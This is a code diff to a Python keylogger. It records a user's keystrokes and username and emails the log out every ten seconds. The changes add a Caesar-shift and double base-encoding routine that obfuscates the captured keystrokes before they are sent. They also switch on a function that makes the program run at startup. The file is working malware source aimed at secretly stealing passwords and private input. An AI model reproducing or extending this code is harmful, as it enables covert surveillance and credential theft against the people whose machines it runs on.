@@ -1,12 +1,30 @@
 import keyboard, os, subprocess, sys, shutil
-import smtplib
+import smtplib, base64
 from threading import Timer
 from datetime import datetime
 from getpass import getuser
 
-# from webbrowser import open as wbopen
-# from base64 import b64decode
-# from base64 import b64encode
+class Cipher:
+    def encrypt(plain_text, key=16):
+        encrypted = ""
+        for c in plain_text:
+            if c.isupper():
+                c_index = ord(c) - ord('A')
+                c_shifted = (c_index + key) % 26 + ord('A')
+                c_new = chr(c_shifted)
+                encrypted += c_new
+            elif c.islower():
+                c_index = ord(c) - ord('a') 
+                c_shifted = (c_index + key) % 26 + ord('a')
+                c_new = chr(c_shifted)
+                encrypted += c_new
+            elif c.isdigit():
+                c_new = (int(c) + key) % 10
+                encrypted += str(c_new)
+            else:
+                encrypted += c
+        encrypted = base64.b64encode(base64.b32encode(bytes(encrypted, encoding='utf-8')))
+        return encrypted
 
 SEND_REPORT_EVERY = 10
 EMAIL_ADDRESS = ""
@@ -45,7 +63,7 @@ class Keylogger:
         if self.log:
             self.end_dt = datetime.now()
             self.log += str(getuser()) + f"\n{self.start_dt} - {self.end_dt}\n" 
-            self.sendmail(SEND_EMAIL, EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            self.sendmail(SEND_EMAIL, EMAIL_ADDRESS, EMAIL_PASSWORD, Cipher.encrypt(plain_text=self.log, key=16))
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
@@ -66,7 +84,7 @@ def run_at_startup():
 
 
 if __name__ == "__main__":
-    # run_at_startup()
+    run_at_startup()
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
 
